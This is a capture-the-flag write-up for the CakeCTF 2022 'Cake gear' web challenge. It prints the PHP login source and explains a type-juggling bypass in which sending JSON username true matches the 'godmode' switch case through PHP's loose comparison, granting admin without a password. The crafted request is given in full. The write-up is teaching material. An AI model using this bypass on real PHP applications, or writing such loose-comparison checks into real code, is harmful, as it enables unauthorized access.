@@ -1,0 +1,276 @@
+<h1 id="cake-gear">Cake gear</h1>
+
+<p>(I didn’t solved it during the ctf, the writeup is based upon other people who have shared their solution so thanks to them)</p>
+
+<p>Visiting the site http://web1.2022.cakectf.com:8005/ , shows the login page</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/188317708-97f1ef3d-907f-4734-8362-4be1c56142d5.png" alt="image" /></p>
+
+<p>Login request looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
+Host: web1.2022.cakectf.com:8005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 39
+Origin: http://web1.2022.cakectf.com:8005
+Connection: close
+Referer: http://web1.2022.cakectf.com:8005/
+Cookie: session=eyJjc3JmX3Rva2VuIjoiMmY1ZGU1ZmJmZmNmODFmYWQ2NWJkYmQ2ZDUyNGQ2ODNjNjMwMzM3ZiIsInVzZXIiOiJzaGlybGV5cyJ9.YxQOog.QWOQS-Wj5lRHqNFrwuTqIvRDMX8; PHPSESSID=5abb07f87a3054791c20c7019c5e8de8
+
+{"username":"admin","password":"admin"}
+</code></pre></div></div>
+
+<p>From view-source, in the javascript  code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>         <span class="kd">function</span> <span class="nf">login</span><span class="p">()</span> <span class="p">{</span>
+             <span class="kd">let</span> <span class="nx">error</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">error-msg</span><span class="dl">'</span><span class="p">);</span>
+             <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">username</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+             <span class="kd">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+             <span class="kd">let</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+             <span class="nx">xhr</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                 <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+                 <span class="k">if </span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+                     <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/admin.php</span><span class="dl">"</span><span class="p">;</span>
+                 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                     <span class="nx">error</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Invalid credential</span><span class="dl">"</span><span class="p">;</span>
+                 <span class="p">}</span>
+             <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
+             <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+             <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
+             <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}));</span>
+         <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can see there’s an endpoint <code class="language-plaintext highlighter-rouge">/admin.php</code> , http://web1.2022.cakectf.com:8005/admin.php but this also redirect us to the login page.So without wasting any more time let’s look at the source code.</p>
+
+<p>There are only two php files admin.php and index.php</p>
+
+<p>index.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'ADMIN_PASSWORD'</span><span class="p">,</span> <span class="s1">'f365691b6e7d8bc4e043ff1b75dc660708c1040e'</span><span class="p">);</span>
+
+<span class="cm">/* Router login API */</span>
+<span class="nv">$req</span> <span class="o">=</span> <span class="o">@</span><span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">));</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'godmode'</span>
+        <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'::1'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="cm">/* Debug mode is not allowed from outside the router */</span>
+        <span class="nb">error_log</span><span class="p">(</span><span class="s2">"You failed...."</span><span class="p">);</span>
+        <span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'nobody'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"Username:"</span><span class="mf">.</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="s1">'godmode'</span><span class="o">:</span>
+            <span class="cm">/* No password is required in god mode */</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="s1">'admin'</span><span class="o">:</span>
+            <span class="cm">/* Secret password is required in admin mode */</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">===</span> <span class="no">ADMIN_PASSWORD</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="s1">'guest'</span><span class="o">:</span>
+            <span class="cm">/* Guest mode (low privilege) */</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">password</span> <span class="o">===</span> <span class="s1">'guest'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* Return response */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'success'</span><span class="p">));</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'error'</span><span class="p">));</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+    ............. strupping the html part
+
+</code></pre></div></div>
+
+<p>admin.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+    <span class="nv">$flag</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/flag.txt"</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">'guest'</span><span class="p">;</span>
+    <span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"***** Access Denied *****"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;title&gt;</span>control panel - CAKEGEAR<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;style&gt;table</span><span class="o">,</span> <span class="nt">td</span> <span class="p">{</span> <span class="nl">margin</span><span class="p">:</span> <span class="nb">auto</span><span class="p">;</span> <span class="nl">border</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span><span class="nt">&lt;/style&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"text-align: center;"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Router Control Panel<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;table&gt;&lt;tbody&gt;</span>
+            <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Status<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;</span>UP<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+            <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Router IP<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;</span>192.168.1.1<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+            <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Your IP<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;</span>192.168.1.7<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+            <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Access Mode<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?=</span> <span class="nv">$mode</span> <span class="cp">?&gt;</span><span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+            <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>FLAG<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?=</span> <span class="nv">$flag</span> <span class="cp">?&gt;</span><span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+        <span class="nt">&lt;/tbody&gt;&lt;/table&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p>As you can see that the flag is visible from the <code class="language-plaintext highlighter-rouge">/admin</code> endpoint, but there is check to validate whether the logged in user is <code class="language-plaintext highlighter-rouge">admin</code> or not. From this we can get a basic idea that , we probably need to somehow gain access to admin acc or something.</p>
+
+<p>Back to the index.php file:</p>
+
+<p>Inside the switch statement there are three cases for three diff users <code class="language-plaintext highlighter-rouge">admin</code> ,<code class="language-plaintext highlighter-rouge">guest</code>,<code class="language-plaintext highlighter-rouge">godmode</code>
+The password for the guest username is <code class="language-plaintext highlighter-rouge">guest</code>, so let’s try to see what’s there</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/188317697-8ae4f5c4-cca5-447e-a818-393da5eed086.png" alt="image" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">godmode</code> username looks interesting so let’s look more into this user,</p>
+
+<p>section <code class="language-plaintext highlighter-rouge">1</code></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$req</span> <span class="o">=</span> <span class="o">@</span><span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">));</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">))</span> <span class="p">{</span>  
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'godmode'</span>
+        <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'::1'</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">//[1]</span>
+        <span class="cm">/* Debug mode is not allowed from outside the router */</span>
+        <span class="nb">error_log</span><span class="p">(</span><span class="s2">"You failed...."</span><span class="p">);</span>
+        <span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'nobody'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"Username:"</span><span class="mf">.</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="s1">'godmode'</span><span class="o">:</span>
+            <span class="cm">/* No password is required in god mode */</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">$req</code> variable basicaly contains the json data sent in the request body
+If you want to know more about why they are using <code class="language-plaintext highlighter-rouge">php://input</code> here, then refer to this post from stackoverflow: https://stackoverflow.com/questions/8893574/php-php-input-vs-post</p>
+
+<p>On line [1], the if condition checks for two things:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'godmode'</span>   <span class="c1">// [2] </span>
+<span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'::1'</span><span class="p">])</span>  <span class="c1">// [3]</span>
+
+</code></pre></div></div>
+
+<p>First just checks if the username in the <code class="language-plaintext highlighter-rouge">$req</code> variable is equal to <code class="language-plaintext highlighter-rouge">godmode</code>
+The second checks the client ip , whether it matches with <code class="language-plaintext highlighter-rouge">['127.0.0.1', '::1']</code> (basically they are checking if the request if coming from localhost or not, there’s a <code class="language-plaintext highlighter-rouge">NOT</code> operator in front of it)</p>
+
+<p>If both the conditions are true</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_log</span><span class="p">(</span><span class="s2">"You failed...."</span><span class="p">);</span>
+<span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'nobody'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Then the <em>YOu failed….</em> message is displayed and the <code class="language-plaintext highlighter-rouge">username</code> is changed to <code class="language-plaintext highlighter-rouge">nobody</code></p>
+
+<p>Inside the switch case, if the <code class="language-plaintext highlighter-rouge">$req-&gt;username</code> returns the <code class="language-plaintext highlighter-rouge">godmode</code> username</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">case</span> <span class="dl">'</span><span class="s1">godmode</span><span class="dl">'</span><span class="p">:</span>
+            <span class="cm">/* No password is required in god mode */</span>
+            <span class="nx">$_SESSION</span><span class="p">[</span><span class="dl">'</span><span class="s1">login</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="nx">$_SESSION</span><span class="p">[</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This case will run, here from the comment you could see there is password requirement and also this is an <code class="language-plaintext highlighter-rouge">admin</code> too, perfect if we can somehow get login as <code class="language-plaintext highlighter-rouge">godmode</code> user we can get the flag</p>
+
+<p>We can’t login as the admin username as there’s strict comparison (===) of the <code class="language-plaintext highlighter-rouge">admin</code> password, if there was a loose comparison then the exploitation method would have been different here.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">case</span> <span class="s1">'admin'</span><span class="o">:</span>
+            <span class="cm">/* Secret password is required in admin mode */</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">===</span> <span class="no">ADMIN_PASSWORD</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h1 id="godmode-user">Godmode user</h1>
+
+<p>If we want to get login as the <code class="language-plaintext highlighter-rouge">godmode</code> user , we must somehow fail this if check (line [1] section 1)</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'::1'</span><span class="p">])</span>
+</code></pre></div></div>
+<p>There is no way to spoof the ip in this case, if they were getting the client ip from headers such <code class="language-plaintext highlighter-rouge">X-Real-Ip</code> or something then we would have been able to add this header to our request and set it’s value to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> to make condition return false (NOT operator).</p>
+
+<p>If there was some sort of parameter pollution bug here, which would return something else here so that the condition returns false</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$req</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'godmode'</span>
+</code></pre></div></div>
+
+<p>And then here in the switch case it returns the <code class="language-plaintext highlighter-rouge">godmode</code> username, but sadly that’s not possible here.</p>
+
+<h1 id="switch-case-loose-comparison">Switch case (loose comparison)</h1>
+
+<p>Looking at the docs of the switch statement:
+https://www.php.net/manual/en/control-structures.switch.php</p>
+
+<p>Under a note section, it mentions that <em>Note that switch/case does loose comparison.</em></p>
+
+<p>Challenge Author’s note:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/188317819-bef4a10f-387d-40a7-8a68-1b2be3744549.png" alt="chrome_4pcIpU7hvJ" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span>  <span class="mi">0</span> <span class="o">==</span> <span class="s2">"godmode"</span><span class="p">;</span>
+<span class="mi">1</span>
+<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span>  <span class="kc">true</span> <span class="o">==</span> <span class="s2">"godmode"</span><span class="p">;</span>
+<span class="mi">1</span>
+</code></pre></div></div>
+
+<p>Cool, so now to solve the challenge we need to provide <code class="language-plaintext highlighter-rouge">true</code> for username value</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
+Host: web1.2022.cakectf.com:8005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 38
+Origin: http://web1.2022.cakectf.com:8005
+Connection: close
+Referer: http://web1.2022.cakectf.com:8005/
+
+
+{"username":true,"password":"admin"}
+</code></pre></div></div>
+
+<p>Then visit the /admin.php endpoint and you will get the flag:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/188317678-a165f8c7-4634-4a89-9c45-8bd3dacdcabd.png" alt="image" /></p>
